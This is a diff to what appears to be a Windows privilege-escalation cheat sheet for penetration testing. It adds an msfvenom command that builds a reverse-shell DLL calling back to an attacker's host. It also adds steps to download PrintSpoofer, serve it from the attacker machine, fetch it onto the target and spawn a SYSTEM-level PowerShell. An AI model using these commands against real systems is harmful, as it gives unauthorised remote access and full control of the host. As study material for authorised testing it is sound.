@@ -22,6 +22,7 @@ whoami /priv
 whoami /groups
 net user
 get-localuser
+Get-WmiObject -Class Win32_UserAccount
 ```
 
 ### Groups
@@ -199,6 +200,8 @@ PS> Get-ModifiableServiceFile
 
 ### DLLs
 
+#### Compiled DLL
+
 Same as binary hijacking:
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -252,6 +255,15 @@ The `fakeadmin` user should be created:
 net user
 net localgroup administrators
 ```
+
+#### Make a reverse shell DLL
+
+With `msfvenom`:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f dll -o missingDLL.dll
+```
+and upload it on the target
+
 
 ### Unquoted service path
 
@@ -309,6 +321,21 @@ And wait for the scheduled task to run
 
 ### Exploits
 
+Example with __SeImpersonatePrivige__:
+- Find a user with the __SeImpersonatePrivilege__ privilege assigned
+- Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe) and share it with a python http server: 
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+python3 -m http.server 80
+```
+- Upload it on the target: `iwr -uri http://$AttackerIp/PrintSpoofer64.exe -outfile printspoofer.exe`
+- Impersonate the __NT AUTHORITY\SYSTEM__ context with PrintSpoofer:
+```
+PS> .\printspoofer.exe -i -c powershell.exe
+PS> whoami # nt authority\system
+```
+
+References:
 - https://github.com/itm4n/PrintSpoofer
 - https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
